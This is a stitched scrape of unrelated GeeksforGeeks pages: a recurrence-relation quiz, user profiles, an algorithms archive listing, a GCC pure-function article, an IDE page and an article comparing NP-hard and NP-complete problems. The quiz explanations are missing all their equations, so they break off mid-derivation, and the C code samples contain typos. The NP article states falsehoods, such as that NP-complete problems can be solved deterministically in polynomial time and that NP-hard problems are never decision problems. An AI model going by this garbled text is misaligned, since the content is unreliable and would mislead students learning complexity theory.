Recurrences | Set 1 Last Updated: 27-12-2018 Question 1: Which of the following is the value of T3(n) where T3(n) is defined as T3(n) = 5*T3(n-1) – 4*T3(n-2) C1*5n + C2*4n C1 + C2*4n C1*2n + C2*4n C1*5n + C2*(-4)n Answer: 2 Explanation: The recursion function (equation) seems to have a strange form. Let’s change the variable T2(n) to get an equation of a familiar form; so, we let A(n) = T3(n); then we have: The characteristic equation of our new differential equation would be: So, the homogeneous solution to this equation shall be: As we have defined A(n) = T3(n), the final answer is: Question 2: Determine the value of initial condition F(1) in a way that we can have F(n) = (n+2)! as the solution to the following given recursive function: F(n) = (n+1) * F(n-1) + (n+1)! 3 4 6 2 Answer: 3 Explanation: Through using the iteration technique to solve the given recursive function, we’ll have: If we continue these derivations, we can easily guess that the answer should be of following form: The last step (stop point) in iteration method is when we reach the initial condition F(1); therefore, we let k = n-1, and the non-recursive form would be: In according to the given function F(n) in question, and what we have derived till now: Finally, as we shall see, the value of F(1) is: Question 3: What is the time Complexity of T(n) = 4* T(n/2) + n * log(n!). θ(n * log n) θ(n2) θ(n2 * log n) θ(n2 * log2 n) Answer: 4 Explanation: We know that log(n!) ∈ θ( n * log n ). Now, the equivalent problem is to analyze the order of the new recursive function: We can solve this by master theorem. In order to apply master theorem here, we have f(n) = n2 * log(n), and the parameters a (the number of sub-problems), b (the reduction factor), and C equal to 4, 2, and 2, respectively; so, θ( nlogba ), is of θ( n2 ) which lies in the same complexity class of θ( nC = 2 ); therefore, the given recursive function is belong to the case 2 of master theorem. In according to master theorem, T(n) would be of following order: Question 4: Which one gives the best estimation of T(n) complexity? T (n) = * T(n/2)+ n2 √n+1. θ( n2 * √n * log n ) O( n2 * √n+1 * log n ) θ( ) θ( ) O( n2 * √n ). Answer: 3 Explanation: We know that , and ; so, we can simplify the recursion function as following: It belongs to the case 3 of the master theorem; so, the asymptotic complexity of T(n) is: Question 5: Which asymptotic boundary is not correct for T (n) = T (n/4) + T (3n/4) + n ? O( nlog4/3 2 ) Ω( n ) O( n * log(n) ) None of above Answer: 4 Explanation: By master theorem, we can specify the same boundaries as indicated in first two options (A) and (B): We can find out the correctness of third option by the recurrence tree method. We draw a tree and we can easily guess an appropriate boundary for T(n): The length of the branches of the recurrence tree cannot be less than hr, and neither can be more than hL; so the following estimations can be inferred: In according to the two boundaries mentioned above, we also have T(n) ∈ θ( n*log(n) ). We know that if T(n) ∈ O(n * log(n)), it must be also of O(nlog4/3n); so if we have evaluated the third option first, we actually would have inferred the correctness of option (A) too. However, recurrence trees just give idea on how to guess an appropriate boundary. As someone may give a wrong guess, this method also needs verification or proof that it will not violate the definition of the notations in use. This verification (proof) can be obtained inductively by iterative substitutions into T(n), while considering the notation definitions. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Algorithms Sample Questions | Recurrences | Set 2Analysis of Algorithm | Set 4 (Solving Recurrences)Master Theorem For Subtract and Conquer RecurrencesAdvanced master theorem for divide and conquer recurrencesAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Pseudo-polynomial AlgorithmsAsymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsLoop Invariant Condition with Examples of Sorting AlgorithmsAnalysis of Algorithms | Big-O analysisInteresting Examples of algorithms in everyday lifeMutation Algorithms for Real-Valued Parameters (GA)Difference between Deterministic and Non-deterministic AlgorithmsHow can one become good at Data structures and Algorithms easily?Data Structures and Algorithms Online Courses : Free and Paidj*g*1991Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : AlgorithmsAnalysisRecursion Practice Tags : RecursionAlgorithms thumb_up 2 To-do Done 5 Based on 1 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Reach the numbers by making jumps of two given lengths Next last_page Sum of LCM(1, n), LCM(2, n), LCM(3, n), … , LCM(n, n) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Algorithms Difference between NP hard and NP complete problemQuadratic Probing in HashingDifference Between Symmetric and Asymmetric Key EncryptionTop 50 Array Coding Problems for InterviewsBlowfish Algorithm with Examples Most visited in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Complexity of different operations in Binary tree, Binary Search Tree and AVL treeAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Difference between NP hard and NP complete problemAnalysis of Algorithms | Set 3 (Asymptotic Notations) room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Danail Kozhuharov GeeksforGeeks Profile share Explore Courses keyboard_arrow_down Get hired Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Get Hired Sign In search close × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password × Danail Kozhuharov personBasic codePractice chrome_reader_modeArticles assignment_turned_inTestimonial schoolInstitutions location_cityOrganizations how_to_regCampus Ambassadors local_post_officeInvite Name Danail Kozhuharov Institution Autodesk Inc 2017 2018 2019 2020 January February March April May June July August September October November December GO! room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Interview Experience Internships Videos @geeksforgeeks, Some rights reserved

biplab_prasad GeeksforGeeks Profile share Explore Courses keyboard_arrow_down Get hired Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Get Hired Sign In search close × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password × biplab_prasad personBasic codePractice chrome_reader_modeArticles assignment_turned_inTestimonial schoolInstitutions location_cityOrganizations how_to_regCampus Ambassadors local_post_officeInvite Name Biplab Institution Jalpaiguri Government Engineering College (JGEC) Jalpaiguri 2018 2019 2020 January February March April May June July August September October November December GO! room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Interview Experience Internships Videos @geeksforgeeks, Some rights reserved

BenceAment GeeksforGeeks Profile share Explore Courses keyboard_arrow_down Get hired Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Get Hired Sign In search close × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password × BenceAment personBasic codePractice chrome_reader_modeArticles assignment_turned_inTestimonial schoolInstitutions location_cityOrganizations how_to_regCampus Ambassadors local_post_officeInvite Name Bence Institution ELTE 2019 2020 January February March April May June July August September October November December GO! room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Interview Experience Internships Videos @geeksforgeeks, Some rights reserved

Analysis Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Time Complexity of building a heapUnderstanding Time Complexity with Simple ExamplesComplexity of different operations in Binary tree, Binary Search Tree and AVL treePractice Questions on Time Complexity AnalysisAnalysis of Algorithms | Big-O analysisAnalysis of different sorting techniquesNP-Completeness | Set 1 (Introduction)Tail RecursionComplexity Analysis of Binary SearchAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does 'Space Complexity' mean?Analysis of Algorithms | Set 5 (Practice Problems)Analysis of algorithms | little o and little omega notationsLower and Upper Bound TheoryCyclomatic ComplexityA Time Complexity QuestionMeasure execution time with high precision in C/C++Time complexity of recursive Fibonacci programDifference between Recursion and IterationDifference between NP hard and NP complete problemDifference between Big Oh, Big Omega and Big ThetaIn-Place AlgorithmPseudo-polynomial AlgorithmsTime Complexity Analysis | Tower Of Hanoi (Recursion)Sort elements by frequency | Set 5 (using Java Map) Category Archives: Analysis Examples of Big-O analysis Last Updated: 24-11-2020 Prerequisite: Analysis of Algorithms | Big-O analysis In the previous article, the analysis of the algorithm using Big O asymptotic notation is discussed. In this… Read More » AnalysisArticlesAlgorithms-Analysis of Algorithms (Recurrences)Analysis of Algorithmstime complexity The Slowest Sorting Algorithms Last Updated: 07-12-2020 A Sorting Algorithm is used to rearrange a given array or list elements according to a comparison operator on the elements. The comparison operator is… Read More » AlgorithmsAnalysisArraysArticlesSortingAlgorithms-Sorting-Quiz Subset Sum is NP Complete Last Updated: 03-11-2020 Prerequisite: NP-Completeness, Subset Sum Problem Subset Sum Problem: Given N non-negative integers a1…aN and a target sum K, the task is to decide if there… Read More » AnalysisArticlesNP Complete Time-Space Trade-Off in Algorithms Last Updated: 29-10-2020 In this article, we will discuss Time-Space Trade-Off in Algorithms. A tradeoff is a situation where one thing increases and another thing decreases. It is… Read More » AlgorithmsAnalysisArticles Optimized Longest Path is NP Complete Last Updated: 14-10-2020 Optimized Longest Path Problem: The optimized longest path problem states that given a graph G, of a set of vertices V and edges E, the… Read More » AnalysisArticlesGraphNP Complete Proof that 4 SAT is NP complete Last Updated: 14-10-2020 4-SAT Problem: 4-SAT is a generalization of 3-SAT(k-SAT is SAT where each clause has k or fewer literals). Problem Statement: Given a formula f in… Read More » AnalysisArticlesNP Complete Proof that Collinearity Problem is NP Complete Last Updated: 15-10-2020 Problem: Given 3 points a, b, c, the task is to check if these three points are collinear. Explanation: An instance of the problem is… Read More » AnalysisArticlesNP Complete Subset Equality is NP Complete Last Updated: 14-10-2020 Subset Equality Problem: Given a set S of non-negative integer values, the problem is to identify if there is a partition of the set S… Read More » AnalysisArticlesGraphNP Complete Proof that SAT is NP Complete Last Updated: 14-10-2020 SAT Problem: SAT(Boolean Satisfiability Problem) is the problem of determining if there exists an interpretation that satisfies a given boolean formula. It asks whether the… Read More » AnalysisArticlesNP Complete Double SAT is NP Complete Last Updated: 14-10-2020 Problem Statement: Given a formula f, the problem is to determine if f has two satisfying assignments. Explanation: An instance of the problem is an… Read More » AnalysisArticlesNP Complete Hitting Set problem is NP Complete Last Updated: 06-10-2020 Prerequisite: NP Complete Problem: Given a ground set X of elements and also a grouping collection C of subsets available in X and an integer… Read More » AnalysisArticlesNP CompleteNPHard Set cover is NP Complete Last Updated: 06-10-2020 Problem: Given a ground Set X, an integer k, and a collection of subsets Si of X, the problem is to identify if there exists… Read More » AnalysisArticlesNP CompleteNPHard 3-coloring is NP Complete Last Updated: 01-10-2020 Prerequisite: NP-Completeness, Graph Coloring Graph K-coloring Problem: A K-coloring problem for undirected graphs is an assignment of colors to the nodes of the graph such… Read More » AnalysisArticlesGraphNP Complete Set partition is NP complete Last Updated: 01-10-2020 Set partition problem: Set partition problem partitions an array of numbers into two subsets such that the sum of each of these two subsets is… Read More » AnalysisArticlesGraphNP Complete Extended Disjoint Set Union on Trees Last Updated: 14-08-2020 Prerequisites: DFS, Trees, DSU Given a tree with of N nodes from value 1 to N and E edges and array arr[] which denotes number… Read More » AnalysisData StructuresGraphTreedisjoint-set Page 1 of 1512345...10...»Last » Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Proof that SAT is NP CompleteProof that traveling salesman problem is NP HardPractice Set for Recurrence RelationsApplications of Hashing Most Visited in Analysis Set cover is NP CompleteDifferent types of recurrence relations and their solutionsHow to learn Pattern printing easily?Complexity analysis of various operations of Binary Min HeapLoop Invariant Condition with Examples of Sorting Algorithms room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Pure Functions - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...What is Memory Leak? How can we avoid?Tree Traversals (Inorder, Preorder and Postorder)Must Do Coding Questions Company-wisePractice for cracking any coding interviewCommonly Asked Data Structure Interview Questions | Set 1Analysis of Algorithms | Set 1 (Asymptotic Analysis)SQL | Join (Inner, Left, Right and Full Joins)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Mutex vs SemaphoreUnderstanding "extern" keyword in CHow to write a Pseudo Code?find command in Linux with examplesAnalysis of Algorithms | Set 4 (Analysis of Loops)OOPs | Object Oriented DesignSQL | GROUP BYData Structures and Algorithms Online Courses : Free and PaidRecursive Practice Problems with SolutionsSQL Interview QuestionsStorage for Strings in CSQL | ORDER BYSQL | ViewsNP-Completeness | Set 1 (Introduction)Little and Big Endian MysteryHow Content Writing at GeeksforGeeks works?Recursive FunctionsWhat is Memory Leak? How can we avoid?SQL | INSERT INTO StatementDo not use sizeof for array parameters Pure Functions Last Updated: 29-05-2017 A function is called pure function if it always returns the same result for same argument values and it has no side effects like modifying an argument (or global variable) or outputting something. The only result of calling a pure function is the return value. Examples of pure functions are strlen(), pow(), sqrt() etc. Examples of impure functions are printf(), rand(), time(), etc. If a function is known as pure to compiler then Loop optimization and subexpression elimination can be applied to it. In GCC, we can mark functions as pure using the “pure” attribute. __attribute__ ((pure)) return-type fun-name(arguments1, …) { /* function body */ } Following is an example pure function that returns square of a passed integer. filter_none edit close play_arrow link brightness_4 code __attribute__ _((pure)) int my_square(int val) { return val*val; } chevron_right filter_none Consider the below example filter_none edit close play_arrow link brightness_4 code for (len = 0; len < strlen(str); ++len) printf("%c", toupper(str[len])); chevron_right filter_none If “strlen()” function is not marked as pure function then compiler will invoke the “strlen()” function with each iteration of the loop, and if function is marked as pure function then compiler knows that value of “strlen()” function will be same for each call, that’s why compiler optimizes the for loop and generates code like following. filter_none edit close play_arrow link brightness_4 code int len = strlen(str); for (i = 0; i < len; ++i) printf("%c", toupper((str[i])); chevron_right filter_none Let us write our own pure function to calculate string length. filter_none edit close play_arrow link brightness_4 code __attribute__ ((pure)) size_t my_strlen(const char *str) { const char *ptr = str; while (*ptr) ++ptr; return (ptr – str); } chevron_right filter_none Marking function as pure says that the hypothetical function “my_strlen()” is safe to call fewer times than the program says. This article is compiled by “Narendra Kangralkar” and reviewed by GeeksforGeeks team. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Pure Virtual Functions and Abstract Classes in C++Pure virtual destructor in C++Game Theory (Normal-form Game) | Set 4 (Dominance Property-Pure Strategy)Difference between Virtual function and Pure virtual function in C++SQL | Functions (Aggregate and Scalar Functions)Recursive FunctionsStatic functions in CWrite one line functions for strcat() and strcmp()Can static functions be virtual in C++?Virtual functions in derived classesFunctions that cannot be overloaded in C++Functions that are executed before and after main() in CCan virtual functions be inlined?Macros vs Functionsfill() and fill_n() functions in C++ STLReturn from void functions in C++Forward List in C++ | Set 1 (Introduction and Important Functions)Forward List in C++ | Set 2 (Manipulating Functions)List in C++ | Set 2 (Some Useful Functions)strtok() and strtok_r() functions in C with examples Article Tags : ArticlesCC++ Practice Tags : CCPP thumb_up 5 To-do Done 2.5 Based on 4 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Simulating final class in C++ Next last_page Exception handling and object destruction | Set 1 Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Articles Running Python script on GPU.Generation of Programming LanguagesProof that SAT is NP Completegetch() function in C with ExamplesStructure Member Alignment, Padding and Data Packing Most visited in C Arrays in C/C++Dynamic Memory Allocation in C using malloc(), calloc(), free() and realloc()std::sort() in C++ STLC Language IntroductionConverting Strings to Numbers in C/C++ room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

IDE | GeeksforGeeks | A computer science portal for geeks Theme keyboard_arrow_down Light Dark Sign In Sign In Report Bug Theme Light Dark × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password C C++ C++14 C# Java Perl PHP Python Python 3 Scala HTML & JS Tab0 Tab1 Tab2 Tab3 Tab4 Copy Reset Shortcuts Copy Run Run+URL (Generates URL as well) C C++ C++14 C# Java Perl PHP Python Python 3 Scala Oops! Something went wrong. You are probably allocating too much memory or producing too much output. Generated URL:Copy Compile Errors : Warnings: Time(sec) : 0.25 Memory(MB) : 0.25 Runtime Errors: Output: Copy Report Bug × Keyboard shortcuts for editor Action Windows/Linux Mac Run Program Ctrl-Enter Command-Enter Find Ctrl-F Command-F Replace Ctrl-H Command-Option-F Remove line Ctrl-D Command-D Move lines down Alt-Down Option-Down Move lines up Alt-UP Option-Up For more shortcuts you can visit the following page: Ace editor shortcuts Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

Difference between NP hard and NP complete problem - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Algorithms | NP Complete | Question 2Algorithms | NP Complete | Question 3Algorithms | NP Complete | Question 4Algorithms | NP Complete | Question 5Algorithms | NP Complete | Question 6Algorithms | NP Complete | Question 1Difference between NP hard and NP complete problemPseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortRecursionA* Search AlgorithmDifference between BFS and DFSHow to write a Pseudo Code?Data Structures and Algorithms Online Courses : Free and PaidRecursive Practice Problems with SolutionsPlayfair Cipher with Examples Difference between NP hard and NP complete problem Last Updated: 08-05-2020 Prerequiste: NP-Completeness NP Problem: The NP problems set of problems whose solutions are hard to find but easy to verify and are solved by Non-Deterministic Machine in polynomial time. NP-Hard Problem: Any decision problem Pi is called NP-Hard if and only if every problem of NP(say P<subj) is reducible to Pi in polynomial time. NP-Complete Problem: Any problem is NP-Complete if it is a part of both NP and NP-Hard Problem. Difference between NP-Hard and NP-Complete: NP-hard NP-Complete NP-Hard problems(say X) can be solved if and only if there is a NP-Complete problem(say Y) can be reducible into X in polynomial time. NP-Complete problems can be solved by deterministic algorithm in polynomial time. To solve this problem, it must be a NP problem. To solve this problem, it must be both NP and NP-hard problem. It is not a Decision problem. It is exclusively Decision problem . Example: Halting problem, Vertex cover problem, Circuit-satisfiability problem, etc. Example: Determine whether a graph has a Hamiltonian cycle, Determine whether a Boolean formula is satisfiable or not, etc. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Proof that traveling salesman problem is NP HardDifference between Hard Disk Drive (HDD) and Solid State Drive (SSD)Difference between Soft Computing and Hard ComputingDifference between Hard link and Soft linkDifference between Hard real time and Soft real time systemDifference between Hard Disk and Floppy DiskDifference between Hard Copy and Soft CopyDifference between Hard drives and Flash drivesDifference between Memory and Hard DiskProof that Clique Decision problem is NP-Complete | Set 2Proof that Subgraph Isomorphism problem is NP-CompleteProof that Clique Decision problem is NP-CompleteHitting Set problem is NP CompleteProof that Collinearity Problem is NP CompleteAlgorithms | NP Complete | Question 1Algorithms | NP Complete | Question 2Algorithms | NP Complete | Question 3Algorithms | NP Complete | Question 4Algorithms | NP Complete | Question 5Algorithms | NP Complete | Question 6sugandha18bcs3001Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : AlgorithmsAnalysisComputer SubjectDifference BetweenAlgorithms-NP CompleteNPHard Practice Tags : Algorithms thumb_up 1 To-do Done 4 Based on 1 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Design a data structure that supports insert, delete, getRandom in O(1) with duplicates Next last_page Conversion of an Undirected Graph to a Directed Euler Circuit Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Algorithms Complexity Analysis of Binary SearchCyclomatic ComplexityQuadratic Probing in HashingQuick Sort vs Merge SortDifference Between Symmetric and Asymmetric Key Encryption Most visited in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Complexity of different operations in Binary tree, Binary Search Tree and AVL treeAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

